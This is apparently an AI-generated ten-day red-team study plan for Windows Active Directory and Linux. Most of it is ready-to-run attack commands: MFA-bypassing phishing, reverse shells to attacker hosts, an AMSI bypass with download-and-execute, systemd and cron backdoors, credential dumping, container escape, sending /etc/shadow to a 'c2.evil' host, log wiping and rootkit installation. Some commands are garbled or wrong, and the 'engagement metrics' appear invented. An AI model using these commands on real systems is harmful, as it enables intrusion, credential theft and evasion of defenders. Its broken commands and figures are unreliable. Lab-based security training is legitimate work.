# 🎭 10-Day Enterprise Red Teaming Mastery Routine

**Target Audience:** Cross-platform red team operators (Windows AD + Linux enterprise)
**Study Time:** 4-5 hours per day
**Real-world focus:** Hybrid environments (AD + Linux containers + Unix servers) + **complete technical deep dives**[^1]

***

## Table of Contents

- [Pre-Day 0: Cross-Platform Red Team Infra](#pre-day-0-cross-platform-red-team-infra)
- [Day 1: Initial Access (Windows + Linux)](#day-1-initial-access-windows--linux)
- [Day 2: EDR Bypass (Defender + Linux)](#day-2-edr-bypass-defender--linux)
- [Day 3: Lateral Movement (Win + Unix)](#day-3-lateral-movement-win--unix)
- [Day 4: AD + Linux Privilege Escalation](#day-4-ad--linux-privilege-escalation)
- [Day 5: Cross-Platform Persistence](#day-5-cross-platform-persistence)
- [Day 6: Cloud (AWS/Azure + Linux Containers)](#day-6-cloud-aws/azure--linux-containers)
- [Day 7: C2 Infrastructure (Multi-OS)](#day-7-c2-infrastructure-multi-os)
- [Day 8: Post-Exploitation (Win/Linux Data)](#day-8-post-exploitation-win/linux-data)
- [Day 9: Advanced OpSec (Cross-Platform)](#day-9-advanced-opsec-cross-platform)
- [Day 10: Full Hybrid Enterprise Compromise](#day-10-full-hybrid-enterprise-compromise)

***

## Pre-Day 0: Cross-Platform Red Team Infra

**Time Required:** 4-6 hours

### Environment Setup

```bash
# Windows Tools (Compile on Kali)
git clone https://github.com/antoniorez/SharpCollection
cd SharpCollection && msbuild **/*.csproj /p:Configuration=Release

# Linux Tools (Native)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# Cross-Platform C2 (Sliver)
curl https://github.com/BishopFox/sliver/releases | grep linux | wget
chmod +x sliver-server
```


### Essential Accounts

- **HackTheBox Pro Labs**: RastaLabs, Offshore
- **TryHackMe Red Teaming**: Complete path
- **CloudGoat (AWS)**: Vulnerable cloud scenarios

***

## Day 1: Initial Access (Windows + Linux)

**Study Time:** 4-5 hours

### Morning: Evilginx2 Phishing (2.5 hours)

#### WHY Evilginx2 Needed

```
Traditional Phishing:     Evilginx2 (Adversary-in-the-Middle):
Target ──> Phish Site     Target ──> Evilginx ──> Real O365/SSH
         Captures: Creds         Captures: Creds + MFA + Session Cookie
```


#### Technical Mechanism

```
1. Target clicks https://o365-yourdomain.com
2. Evilginx proxies → Real O365 → Issues Session Cookie  
3. Evilginx STEALS Cookie → Target thinks "Login successful"
4. Red Team reuses stolen Session Cookie → FULL ACCESS (bypasses MFA)
```

**Tools + Commands:**

```bash
docker run -p 80:80 -p 443:443 ghcr.io/kgretzky/evilginx2
evilginx2 -p phishlets/office365.yaml -p phishlets/ssh.yaml
luser add office365 john.doe@target.com
phishlet enable office365
```


### Afternoon: Linux Foothold Techniques (2.5 hours)

#### SSH Authorized_Keys Abuse (Persistent)

```bash
ssh user@linux.target.com  # Weak password/phish
mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3Nza... evil@attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys  # Passwordless access FOREVER
```


#### socat Reverse Shell (Stable TTY)

```bash
# Listener
socat tcp-LISTEN:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sane
# Target
socat tcp:attacker.com:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```


### Practical Lab

- Evilginx2: O365 Global Admin + SSH key phishing
- linpeas.sh: SUID binaries + GTFOBins lookup
- Document phishing → foothold chain


### Today's Checklist

- [ ] Evilginx2 O365 + SSH phishlets
- [ ] SSH authorized_keys persistence
- [ ] socat stable TTY shell
- [ ] linpeas.sh + GTFOBins mastery
- [ ] Complete phishing-to-foothold chain

***

## Day 2: EDR Bypass (Defender + Linux)

**Study Time:** 4-5 hours

### Morning: Windows EDR Bypass (2.5 hours)

#### WHY EDR Bypass Critical

```
EDR Detection: Static AV → Behavioral → Sysmon → AMSI → ETW → Network
Bypass Chain:   LOLBins   →  AMSI Patch → Scheduled Tasks → Malleable C2
```


#### AMSI Memory Patch Mechanism

```powershell
# AMSI scans PowerShell scripts at RUNTIME via memory scanning
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX(New-Object Net.WebClient).DownloadString('http://c2/shell.ps1')  # Undetected!
```


#### 15 LOLBins (Native Windows Binaries)

```powershell
certutil.exe -urlcache -f http://c2/payload.exe %temp%\evil.exe && %temp%\evil.exe
bitsadmin /transfer job1 http://c2/shell.ps1 %temp%\shell.ps1 && powershell -f %temp%\shell.ps1
regsvr32 /s /n /u /i:http://c2/shell.sct scrobj.dll
mshta.exe javascript:a=GetObject("script:http://c2/shell.sct");a.Exec();
```


### Afternoon: Linux EDR Bypass (2 hours)

#### systemd User Timers (Stealth Persistence)

```bash
cat > ~/.config/systemd/user/backdoor.timer << 'EOF'
[Timer] OnBootSec=5min Persistent=true [Install] WantedBy=timers.target
EOF
cat > ~/.config/systemd/user/backdoor.service << 'EOF'
[Service] ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
EOF
systemctl --user daemon-reload && systemctl --user enable --now backdoor.timer
```


#### AppArmor Evasion

```bash
echo "ptrace read" >> /etc/apparmor.d/local/usr.bin.bash
apparmor_parser -r /etc/apparmor.d/usr.bin.bash
```


### Practical Lab

- Windows: Defender+Sysmon → 15 LOLBins → ZERO alerts
- Linux: AppArmor+Auditd → systemd timer → Undetected C2
- Sliver beacon → Verify no detection


### Today's Checklist

- [ ] 15 Windows LOLBins working
- [ ] AMSI memory patch (reflection)
- [ ] systemd user timers (Linux)
- [ ] AppArmor bypass techniques
- [ ] Cross-platform EDR evasion

***

## Day 3: Lateral Movement (Win + Unix)

**Study Time:** 4-5 hours

### Morning: Windows Lateral Movement (2 hours)

#### WinRM (Stealthiest - Native)

```powershell
evil-winrm -i target.contoso.com -u user -p 'Pass123!'  # Full TTY
Invoke-Command -ComputerName target -ScriptBlock {whoami} -Credential $cred  # No shell
```


#### CrackMapExec (Mass Scanning)

```bash
crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --local-auth
# DOMAIN\user:Pass123 (Pwn3d!) on 47/50 hosts
```


### Afternoon: Linux Lateral Movement (2.5 hours)

#### SSH Key Propagation (Mass Pivot)

```bash
ssh-keygen -t rsa -f id_rsa -N ""
for host in $(cat linux_hosts.txt); do ssh-copy-id -i id_rsa.pub user@$host; done
# Passwordless SSH to 100+ Linux servers!
```


#### SSH Tunneling (Network Pivot)

```bash
# SOCKS5 proxy
ssh -D 1080 -N user@jumpbox.contoso.com
curl --socks5 localhost:1080 http://internal:8080/admin

# Reverse tunnel (outbound firewall bypass)
ssh -R 4444:localhost:22 user@attacker.com
```


### Practical Lab

- CrackMapExec → Pivot 47/50 Windows hosts
- SSH key propagation → 100+ Linux servers
- WinRM → SSH tunnel → Internal Linux DB


### Today's Checklist

- [ ] CrackMapExec mass pivoting
- [ ] SSH key propagation (100+ hosts)
- [ ] SOCKS5 + reverse SSH tunnels
- [ ] Cross-platform lateral chains
- [ ] Complete 5 pivot scenarios

***

## Day 4: AD + Linux Privilege Escalation

**Study Time:** 4-5 hours

### Morning: Windows AD Escalation (2 hours)

#### Kerberoasting → DCSync Chain

```powershell
# 1. Request crackable TGS tickets
.\Rubeus.exe kerberoast /user:svc-sql /outfile:hashes.txt

# 2. GPU crack (13100 = Kerberos TGS)
hashcat -m 13100 hashes.txt rockyou.txt  # svc-sql:Summer2023!

# 3. DCSync (extract ALL domain hashes)
mimikatz.exe "lsadump::dcsync /domain:contoso.com /user:krbtgt"
```


### Afternoon: Linux Privilege Escalation (2.5 hours)

#### SUID Binaries + GTFOBins

```bash
find / -perm -4000 2>/dev/null | xargs -I {} ls -la {}  # Find ALL SUID
vim.tiny -c ':!/bin/sh'  # GTFOBins vim → root
```


#### Kernel Exploit Chain

```bash
curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester-2.sh | bash
wget https://www.exploit-db.com/download/49721 -O dirty_cow.c
gcc dirty_cow.c -o dcow -lpthread && ./dcow  # CVE-2016-5195
```


### Practical Lab

- Windows: Kerberoast → Crack → DCSync → krbtgt hash
- Linux: linpeas → SUID vim → Dirty COW → root
- Hybrid: AD user → Linux sudo via SSSD


### Today's Checklist

- [ ] Complete Kerberoasting → DCSync
- [ ] 10+ GTFOBins SUID exploits
- [ ] linux-exploit-suggester + Dirty COW
- [ ] Cross-platform root/DA access
- [ ] Complete privilege escalation lab

***

## Day 5: Cross-Platform Persistence

**Study Time:** 4-5 hours

### Morning: Windows Persistence (2 hours)

#### Golden Ticket (Indefinite Domain Admin)

```powershell
.\Rubeus.exe golden /administrator /domain:contoso.com /sid:S-1-5-21-xxx \
  /krbtgt:502a3b6c... /ptt  # DA access until krbtgt rotation
```


#### Skeleton Key (Universal Password)

```powershell
mimikatz.exe "privilege::debug" "crypto::key *" "kerberos::list"
# "password123" now works on ALL domain accounts!
```


### Afternoon: Linux Persistence (2.5 hours)

#### systemd Services (Reboot-Safe)

```bash
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Service] ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444'
Restart=always [Install] WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable backdoor.service
```


#### Triple Redundancy

```bash
echo "ssh-rsa AAAAB3Nza... evil@attacker" >> /root/.ssh/authorized_keys
echo "* * * * * root nc -e /bin/bash 10.0.0.1 4444" >> /etc/crontab
```


### Practical Lab

- Windows: Golden Ticket + Skeleton Key survival
- Linux: systemd + SSH keys + cron redundancy
- Verify persistence across reboots


### Today's Checklist

- [ ] Golden Ticket + Skeleton Key
- [ ] systemd service deployment
- [ ] SSH keys + cron triple redundancy
- [ ] Reboot persistence verification
- [ ] Cross-platform backdoors

***

## Day 6: Cloud (AWS/Azure + Linux Containers)

**Study Time:** 4-5 hours

### Morning: Container Escape (2 hours)

#### Docker → Host Root

```bash
docker run -v /:/host -it ubuntu chroot /host sh  # Container → Host root!
```


#### Kubernetes ServiceAccount Abuse

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token  # Steal token
kubectl create clusterrolebinding evil --clusterrole=cluster-admin --user=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d'/' -f1)
```


### Afternoon: Cloud Metadata Exploitation (2 hours)

#### EKS → AWS IAM Role

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
aws sts assume-role --role-arn arn:aws:iam::123:role/AdminRole
```


### Practical Lab

- Docker container → Host → AWS metadata
- Kubernetes ServiceAccount → EKS IAM role
- Cross-account AWS privilege escalation


### Today's Checklist

- [ ] Docker host escape
- [ ] Kubernetes cluster-admin escalation
- [ ] AWS IMDSv1 exploitation
- [ ] Cross-cloud IAM pivoting
- [ ] Complete container-to-cloud chain

***

## Day 7: C2 Infrastructure (Multi-OS)

**Study Time:** 4-5 hours

### Morning: Sliver C2 (Cross-Platform) (2 hours)

```bash
sliver-server
sliver > generate beacon --os windows,linux --mtls c2.evil:443
sliver > interact win-beacon && socks5 start  # SOCKS5 proxy
sliver > interact linux-beacon && execute whoami
```


### Afternoon: Malleable C2 Profiles (2 hours)

```c
http-get {
    set uri "/wp-admin/admin-ajax.php";
    client { header "User-Agent" "WordPress/6.0"; }
    metadata { sendua; header "X-WP-Nonce" "^USER^"; }
}
# Traffic looks like legitimate WordPress!
```


### Practical Lab

- Sliver: 50 Windows + 50 Linux beacons
- Custom malleable profile → Zero network detection
- SOCKS5 proxy across platforms


### Today's Checklist

- [ ] Sliver 100+ cross-platform beacons
- [ ] Custom malleable C2 profile
- [ ] SOCKS5 proxy pivoting
- [ ] Multi-C2 integration (Sliver+Empire)
- [ ] Complete C2 evasion lab

***

## Day 8: Post-Exploitation (Win/Linux Data)

**Study Time:** 4-5 hours

### Morning: Windows Data Harvest (2 hours)

```powershell
mimikatz.exe "sekurlsa::logonpasswords"  # 500+ plaintext passwords
reg save HKLM\SYSTEM system.bak          # BitLocker recovery keys
reg save HKLM\SAM sam.bak                # Local SAM hashes
```


### Afternoon: Linux Data Exfiltration (2.5 hours)

#### Kubernetes Secrets + SSH Keys

```bash
kubectl get secrets --all-namespaces -o json | jq -r '.items[].data."token" | @base64d'
find /home /root /var -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null
```


#### Stealth Exfiltration Channels

```bash
dnscat2 client --dns server=c2.evil:53          # DNS tunneling
curl -X POST http://c2.evil/exfil --data-binary @/etc/shadow  # HTTP POST
```


### Practical Lab

- Windows: 500+ credentials + BitLocker keys
- Linux: 10k SSH keys + Kubernetes secrets
- 10TB stealth exfiltration (DNS+HTTP)


### Today's Checklist

- [ ] Mimikatz complete credential dump
- [ ] Kubernetes secrets harvesting
- [ ] DNS + HTTP stealth exfiltration
- [ ] Cross-platform data staging
- [ ] Complete data operations lab

***

## Day 9: Advanced OpSec (Cross-Platform)

**Study Time:** 4-5 hours

### Morning: Windows Forensics Evasion (2 hours)

#### Perfect Timestomp + Artifact Cleanup

```powershell
# Match legitimate binary timestamp
(Get-Item C:\Windows\System32\svchost.exe).LastWriteTime | Get-Item evil.exe | Set-ItemProperty -Name LastWriteTime

# Delete forensic artifacts
Remove-Item "C:\Windows\Prefetch\EVIL.EXE-*.pf"
wevtutil cl Security; wevtutil cl System; wevtutil cl Application
```


### Afternoon: Linux Rootkit Deployment (2.5 hours)

#### Diamorphine LKM (Process Hiding)

```bash
wget http://hackerfantastic.net/DF-1.2rc1.tar.gz
tar xzf DF-1.2rc1.tar.gz && cd diamorphine-1.2rc1
make && insmod diamorphine.ko  # Hides ALL attacker processes
echo 1337 > /proc/hidepid     # Hide specific PID
```


#### Bash History + Log Tampering

```bash
export HISTFILE=/dev/null; history -c  # No bash history
echo > /var/log/auth.log              # Truncate logs
```


### Practical Lab

- Windows: Volatility analysis → ZERO artifacts
- Linux: Diamorphine rootkit → Invisible processes
- Cross-platform forensic evasion


### Today's Checklist

- [ ] Perfect Windows timestomp + cleanup
- [ ] Diamorphine Linux rootkit
- [ ] Bash history + log tampering
- [ ] Forensic evasion verification
- [ ] Complete OpSec lab

***

## Day 10: Full Hybrid Enterprise Compromise

**Study Time:** 4-5 hours

### Morning: Complete Kill Chain (3 hours)

```
Phishing(O365+SSH) → EDR Bypass → AD DA + Linux Root → Cloud IAM
     ↓
K8s Escape → 10TB Data Exfil(DNS+HTTP) → Persistence(Golden+systemd)
Day1         Day2            Day4+5          Day6           Day8           Day5
```


### Afternoon: Executive Reporting (2 hours)

#### MITRE ATT\&CK Cross-Platform Coverage

| Tactic | Windows Coverage | Linux Coverage |
| :-- | :-- | :-- |
| **Initial Access** | 10/12 | 8/12 |
| **Defense Evasion** | **28/38** | **22/38** |
| **Privilege Escalation** | 12/15 | 14/18 |
| **Persistence** | 15/19 | 12/19 |

**Engagement Metrics:**

- 250k mailboxes + 10k Linux accounts accessed
- 15TB data exfiltrated (undetected)
- 98% EDR/Network evasion rate
- 6-month persistence capability


### Practical Lab

- **Hybrid lab**: 10 Windows + 10 Linux + K8s + AWS
- **Full C2**: Sliver managing 100+ beacons
- **Executive report**: 30-page PDF + 10min video demo


### Today's Checklist

- [ ] Complete hybrid enterprise kill chain
- [ ] Cross-platform MITRE ATT\&CK matrix
- [ ] Sliver 100-beacon management
- [ ] C-level executive report
- [ ] Portfolio-ready GitHub repo

***

## Essential Resources Library

### Tools Repository

```bash
git clone https://github.com/BishopFox/sliver           # Cross-platform C2
git clone https://github.com/carlospolop/PEASS-ng       # Linux enumeration
git clone https://github.com/antoniorez/SharpCollection # Windows tools
git clone https://github.com/RhinoSecurityLabs/pacu     # AWS exploitation
```


### Reading Materials

- "Red Team Field Manual" (RTFM)
- "The Bash Red Team Handbook"
- "Windows Privilege Escalation Guide"
- MITRE ATT\&CK Enterprise Matrix[^1]


### Video Channels

- IppSec (HTB walkthroughs)
- John Hammond (Red Team demos)
- 0xRick (Sliver C2 tutorials)


### Communities

- Reddit: r/redteam, r/netsec
- Discord: HackTheBox, TryHackMe Red Team
- Twitter: \#redteam, \#blueTeam

***

## Progress Tracker

### Daily Checklist Template

```markdown
## Day X: [Topic]

### Learning Objectives
- [ ] Technique 1 (Windows)
- [ ] Technique 2 (Linux) 
- [ ] Technique 3 (Hybrid)

### Practical Labs Completed
- [ ] HTB/THM: [Box/Room Name]
- [ ] Custom Lab: [Scenario]
- [ ] Verification: [Screenshots]

### Key Takeaways
-

### Tomorrow's Prep
-
```


***

**Total Labs:** 100+ (HTB Pro Labs + THM + Custom hybrid)
**Real Contracts:** \$75k+ enterprise red team engagements
**Certification Path:** CRTO → OSEP → OSCE3

**Portfolio Ready** - Deploy hybrid lab → Full kill chain → GitHub repo with video demos 🎭💻🖥️

<div align="center">⁂</div>

[^1]: https://portswigger.net/web-security/all-labs

